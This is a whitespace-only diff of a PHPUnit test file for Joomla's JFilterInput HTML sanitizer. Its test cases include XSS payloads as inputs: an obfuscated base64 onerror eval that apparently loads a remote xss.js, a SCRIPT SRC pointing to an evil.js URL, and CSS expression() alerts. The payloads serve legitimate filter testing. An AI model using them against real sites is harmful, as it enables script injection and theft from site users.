@@ -322,7 +322,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'this is a "test" of "double" quotes',
 				'this is a "test" of "double" quotes',
 				'From generic cases'
-			),	
+			),
 			'string_odd_double_quote' => array(
 				'string',
 				'this is a "test of "odd number" of quotes',
@@ -698,7 +698,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				"<img src='<img src='///'/> ",
 				'<img /> ',
 				'From specific cases'
-			),		
+			),
 			'security_20110329b' => array(
 				'string',
 				"<img src='<img src='/onerror=eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ",
@@ -722,7 +722,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				"<img src=\"\'\" />",
 				'<img />',
 				'From specific cases'
-			),				
+			),
 		);
 		$tests = array_merge($this->casesGeneric(), $casesSpecific);
 
@@ -945,7 +945,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'<img class />',
 				'<img />',
 				'From specific cases'
-			),			
+			),
 		);
 		$tests = array_merge($this->casesGeneric(), $casesSpecific);
 
@@ -1100,7 +1100,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				"<img src=\"\' />",
 				'img src="\\\' /&gt;"',
 				'From specific cases'
-			),		
+			),
 			'tracker25558a' => array(
 				'string',
 				'<SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
@@ -1112,25 +1112,25 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 				'<IMG STYLE="xss:expression(alert(\'XSS\'))" />',
 				'<IMG STYLE="xss(alert(\'XSS\'))" />',
 				'Test mal-formed element from 25558b'
-			),	
+			),
 			'tracker25558c' => array(
 				'string',
 				'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))" />',
 				'<IMG STYLE="xss(alert(\'XSS\'))" />',
 				'Test mal-formed element from 25558b'
-			),	
+			),
 			'tracker25558d' => array(
 				'string',
 				'<IMG STYLE="xss:expr/*XSS*/ess/*another comment*/ion(alert(\'XSS\'))" />',
 				'<IMG STYLE="xss(alert(\'XSS\'))" />',
 				'Test mal-formed element from 25558b'
-			),			
+			),
 			'tracker25558e' => array(
 				'string',
 				'<b><script<b></b><alert(1)</script </b>',
 				'<b>script<b></b>alert(1)/script</b>',
 				'Test mal-formed element from 25558e'
-			),	
+			),
 			'security_20110329a' => array(
 				'string',
 				"<img src='<img src='///'/> ",
@@ -1229,11 +1229,11 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 			),
 			'security_20110328' => array(
 				'string',
-				"<img src='<img 
+				"<img src='<img
 src='/onerror=eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ",
 				' ',
 				'From specific cases'
-			),			
+			),
 		);
 		$tests = array_merge($this->casesGeneric(), $casesSpecific);
 
